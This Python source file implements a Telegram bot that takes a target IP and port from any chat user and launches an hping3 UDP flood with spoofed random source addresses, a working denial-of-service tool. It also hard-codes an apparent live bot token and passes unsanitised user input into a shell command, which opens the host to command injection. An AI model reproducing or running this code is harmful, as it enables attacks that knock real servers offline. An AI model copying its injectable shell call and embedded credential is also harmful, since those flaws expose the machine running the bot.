import subprocess
import telebot
from telebot import types

# Replace 'YOUR_TOKEN' with your actual bot token
API_TOKEN = '6306399777:AAGO0tUcRAL_jbApX45y8VwBqCCQ6gXa5uw'
bot = telebot.TeleBot(API_TOKEN)

# State to track conversation
user_state = {}

# Function to install hping3
def install_hping3():
    try:
        subprocess.run("apt-get update && apt-get install -y hping3", shell=True, check=True)
        print("hping3 installed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred during installation: {e}")

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, 'Welcome! Please enter the IP address of the server:')
    user_state[message.chat.id] = {'step': 'ip'}

@bot.message_handler(func=lambda message: message.chat.id in user_state and user_state[message.chat.id]['step'] == 'ip')
def get_ip(message):
    user_state[message.chat.id]['ip'] = message.text
    bot.reply_to(message, f"IP received: {message.text}. Now enter the port:")
    user_state[message.chat.id]['step'] = 'port'

@bot.message_handler(func=lambda message: message.chat.id in user_state and user_state[message.chat.id]['step'] == 'port')
def get_port(message):
    user_state[message.chat.id]['port'] = message.text
    ip = user_state[message.chat.id]['ip']
    port = user_state[message.chat.id]['port']
    
    bot.reply_to(message, f"Starting hping3 on {ip}:{port}...")
    
    command = f"hping3 -2 -c 1000000 -d 1024 -p {port} --flood --rand-source {ip}"
    try:
        subprocess.run(command, shell=True, check=True)
        bot.reply_to(message, "Command executed successfully!")
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"An error occurred: {e}")
    
    # Clear the state
    user_state.pop(message.chat.id, None)

@bot.message_handler(commands=['cancel'])
def cancel(message):
    if message.chat.id in user_state:
        user_state.pop(message.chat.id, None)
        bot.reply_to(message, 'Operation cancelled.')

if __name__ == '__main__':
    install_hping3()
    bot.polling()
